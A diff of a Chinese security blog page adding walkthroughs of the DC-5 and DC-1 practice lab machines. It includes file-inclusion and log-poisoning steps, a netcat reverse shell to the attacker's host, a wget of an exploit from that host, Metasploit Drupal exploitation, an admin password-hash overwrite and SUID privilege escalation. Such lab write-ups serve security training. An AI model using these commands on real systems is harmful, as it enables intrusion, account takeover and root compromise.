@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      704 字
+      2.8k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      37
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：几秒前
+                  本文最后更新于：2 个月前
                 
               </p>
             
@@ -312,6 +312,175 @@ exec(<span class="hljs-string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&am
 
 <p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930002110117.png" srcset="/img/loading.gif" alt="image-20220930002110117"></p>
 <h2 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929122622040.png" srcset="/img/loading.gif" alt="image-20220929122622040"></p>
+<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>运行虚拟机后，将kali与靶机配置到同一网卡下即可</p>
+<p>kali的ip地址：<code>192.168.56.101</code></p>
+<h2 id="网络嗅探-1"><a href="#网络嗅探-1" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用netdiscover发现当前网络中存活的主机</p>
+<div class="hljs"><pre><code class="hljs sh">netdiscover -i eth0</code></pre></div>
+
+<p>探测到靶机的ip地址为：<code>192.168.56.102</code></p>
+<p>再使用nmap扫描开放的服务端口</p>
+<div class="hljs"><pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.56.102</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930163714244.png" srcset="/img/loading.gif" alt="image-20220930163714244"></p>
+<p>可以看到靶机的80端口是开启的，直接访问。</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>网页中存在一个留言板<code>http://192.168.220.139/contact.php</code></p>
+<p>提交留言信息会跳转到<code>http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1</code></p>
+<p>此时再次刷新页面，会发现右下角的copyright会发生变化</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930164227501.png" srcset="/img/loading.gif" alt="image-20220930164227501"></p>
+<p>首先使用dirb 去探测网站中的所有url，但是效果不好只能探测到index.php</p>
+<p>那么就用bp的intruder模块加载自己的字典进行路劲爆破，最后爆破结果如下</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930172927445.png" srcset="/img/loading.gif" alt="image-20220930172927445"></p>
+<p>这里的footer是网页源码中没有暴露的页面。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930173042421.png" srcset="/img/loading.gif" alt="image-20220930173042421"></p>
+<p>由于footer.php的内容可以显示子再thankyou.php中，那么thankyou.php一定是包含了footer.php，那么下面的要找出thankyou.php包含文件的参数是什么</p>
+<p>尝试</p>
+<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?page=footer.php
+http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?file=footer.php</code></pre></div>
+
+<p>发现以上两个参数都可以正常访问</p>
+<p>接下来就是尝试文件包含漏洞</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>上面已经发现页面存在文件包含，很直观的想法就是看能否将<code>/etc/passwd</code>读取到</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930232717029.png" srcset="/img/loading.gif" alt="image-20220930232717029"></p>
+<div class="hljs"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span></code></pre></div>
+
+
+
+<p>从http的响应头可以看到网站使用的中间件是nginx，那么可尝试获取去nginx的日志文件，默认绝对路径为<code>/var/log/nginx/access.log</code></p>
+<p>使用url<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001160016500.png" srcset="/img/loading.gif" alt="image-20221001160016500"></p>
+<p>这里一定得要用bp，不然会由于浏览器的自动编码导致失效</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001105755300.png" srcset="/img/loading.gif" alt="image-20221001105755300"></p>
+<p>能够发现刚才的访问记录已经被写入到了日志文件中</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930234744268.png" srcset="/img/loading.gif" alt="image-20220930234744268"></p>
+<p><strong>PHP中造成文件包含的四个函数</strong></p>
+<blockquote>
+<p><strong>1、include() 、require()</strong></p>
+<p><strong>当使用include()函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</strong></p>
+<p><strong>当使用require()函数包含文件时，只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行</strong></p>
+<p><strong>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
+<p><strong>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
+<p>​       <strong>当使用上述四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。</strong></p>
+</blockquote>
+<p>一句话木马上传成功后，就可以使用蚁剑连接了</p>
+<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span><span class="hljs-regexp">/thankyou.php?file=/</span>var<span class="hljs-regexp">/log/</span>nginx/access.log
+密码：<span class="hljs-number">666</span></code></pre></div>
+
+<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>再kali中监听4444端口</p>
+<div class="hljs"><pre><code class="hljs sh">nc -lvvp 4444</code></pre></div>
+
+<p>再蚁剑的终端中执行</p>
+<div class="hljs"><pre><code class="hljs sh">nc  -e  /bin/bash  192.168.56.101 4444</code></pre></div>
+
+<p>此时已经获取shell</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113341268.png" srcset="/img/loading.gif" alt="image-20221001113341268"></p>
+<p>使用python的反弹shell</p>
+<div class="hljs"><pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre></div>
+
+<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>使用find命令，查找具有suid权限的命令，发现screen-4.5.0</p>
+<div class="hljs"><pre><code class="hljs sh">find / -perm /4000 2 &gt; /dev/null</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113542405.png" srcset="/img/loading.gif" alt="image-20221001113542405"></p>
+<p>那么就可以查找可用于screen 4.5.0的漏洞脚本文件，再kali中查找</p>
+<div class="hljs"><pre><code class="hljs sh">searchsploit screen 4.5.0</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113845331.png" srcset="/img/loading.gif" alt="image-20221001113845331"></p>
+<p>将脚本拷贝到当前工作目录</p>
+<div class="hljs"><pre><code class="hljs sh">cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41154.sh  41154.sh
+
+cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41152.txt  41152.txt</code></pre></div>
+
+<p>尝试从蚁剑上传到网站的根目录，但是发现权限不够，最后再/tmp目录上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120350730.png" srcset="/img/loading.gif" alt="image-20221001120350730"></p>
+<p>加上可执行权限即可</p>
+<div class="hljs"><pre><code class="hljs sh">chmod +x 41154.sh</code></pre></div>
+
+<p>在kali中的shell执行</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120551421.png" srcset="/img/loading.gif" alt="image-20221001120551421"></p>
+<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><p>进入root目录即可获取到flag</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120217058.png" srcset="/img/loading.gif" alt="image-20221001120217058"></p>
+<h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>将靶机与kali放在同一网卡下实现相互通信即可</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用</p>
+<div class="hljs"><pre><code class="hljs sh">arp-scan -l
+netdiscover -eth0</code></pre></div>
+
+<p>发现目标靶机的ip地址为<code>192.168.56.103</code></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005124337784.png" srcset="/img/loading.gif" alt="image-20221005124337784"></p>
+<p>直接方位该ip地址，发现是可访问的网站，但是需要密码无法进入</p>
+<p>但是很明显可以看出此网站使用的CMS为Drupal,那么就寻找与该CMS存在的漏洞即可</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005125020123.png" srcset="/img/loading.gif" alt="image-20221005125020123"></p>
+<p>可以看到关于drupal 的漏洞有七个，但是我们需要选择最新的且等级为excellent的</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里使用的是<code>exploit/multi/http/drupal_drupageddon</code></p>
+<div class="hljs"><pre><code class="hljs sh">use exploit/multi/http/drupal_drupageddon
+<span class="hljs-built_in">set</span> RHOSTS 192.168.56.103
+<span class="hljs-built_in">set</span> LHOST 192.168.56.101
+run</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005130958089.png" srcset="/img/loading.gif" alt="image-20221005130958089"></p>
+<p>网站的根目录中存在一个flag1.txt，其中提示</p>
+<div class="hljs"><pre><code class="hljs gradle"><span class="hljs-keyword">Every</span> good CMS needs a config <span class="hljs-keyword">file</span> - and so <span class="hljs-keyword">do</span> you.</code></pre></div>
+
+<p>那么就是找cms的配置文件，而drupal的默认配置文件位置 <code>/var/www/sites/default/settings.php</code></p>
+<p>查看此配置文件，可以看到mysql数据库的账号密码</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005131437953.png" srcset="/img/loading.gif" alt="image-20221005131437953"></p>
+<p>并且出现了flag2</p>
+<blockquote>
+<p>翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
+</blockquote>
+<h2 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h2><p>在msfconsole中获取shell后使用执行下面这句话</p>
+<div class="hljs"><pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
+连接数据库
+
+mysql -udbuser -p</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005133337362.png" srcset="/img/loading.gif" alt="image-20221005133337362"></p>
+<p>密码是加密后保存到数据库的。但是在<code>/var/www/script</code>中发现了将密码转换为hash的脚本，可以使用脚本生成自己的密码的hash然后保存到数据库中，可惜的是该标本的环境存在问题，无法运行</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005134059498.png" srcset="/img/loading.gif" alt="image-20221005134059498"></p>
+<p>百度以下<code>drupal 密码</code>相关的问题，发现有重置admin密码的方法</p>
+<blockquote>
+<p>password的SHA-512加密运算的结果“$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4”；</p>
+</blockquote>
+<p>那么就是在数据库中更新admin的密码即可</p>
+<div class="hljs"><pre><code class="hljs mysql">update users set pass &#x3D; &#39;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4&#39; where name &#x3D; &#39;admin&#39;;</code></pre></div>
+
+<p>登录后在网站中发现了flag3</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135247304.png" srcset="/img/loading.gif" alt="image-20221005135247304"></p>
+<blockquote>
+<p>特殊的PERMS将帮助查找passwd -但您需要-exec该命令来找出如何获取阴影中的内容。</p>
+</blockquote>
+<p>在<code>home/flag4</code>中看到flag4</p>
+<blockquote>
+<p>Can you use this same method to find or access the flag in root?</p>
+<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
+<p>您可以使用相同的方法在根目录中查找或访问标志吗?</p>
+<p>可能。但也许并没有那么容易。也许是这样?</p>
+</blockquote>
+<p><strong>使用CVE2014-3704添加管理账号</strong></p>
+<p>在exploit-db中有可以直接利用的EXP，可以直接添加管理账号<br>地址：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/34992">https://www.exploit-db.com/exploits/34992</a></p>
+<p>在kali中开启web服务，然后再靶机中下载该exp</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span></code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005142802768.png" srcset="/img/loading.gif" alt="image-20221005142802768"></p>
+<div class="hljs"><pre><code class="hljs awk">靶机端下载
+wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span>/<span class="hljs-number">34992</span>.py
+靶机端运行
+python <span class="hljs-number">34992</span>.py -t http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.103</span>/ -u hack -p root</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005143232685.png" srcset="/img/loading.gif" alt="image-20221005143232685"></p>
+<p>直接使用hack 登录</p>
+<h2 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h2><p>使用find找下具有root权限的suid</p>
+<div class="hljs"><pre><code class="hljs sh">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null  <span class="hljs-comment"># 这句也可以</span></code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135623191.png" srcset="/img/loading.gif" alt="image-20221005135623191"></p>
+<p>可以发现find命令可以用来提权</p>
+<p>尝试使用find执行命令</p>
+<div class="hljs"><pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \; <span class="hljs-comment"># 注意这里的-name 后的参数需要是存在的文件</span></code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141313251.png" srcset="/img/loading.gif" alt="image-20221005141313251"></p>
+<p>这里执行的结果可以看出find是可以提权的</p>
+<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>直接使用执行 <code>/bin/sh</code></p>
+<div class="hljs"><pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</code></pre></div>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141539383.png" srcset="/img/loading.gif" alt="image-20221005141539383"></p>
 
             </div>
             <hr>
@@ -334,6 +503,12 @@ exec(<span class="hljs-string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&am
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/12/07/chatroom/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">chatroom</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
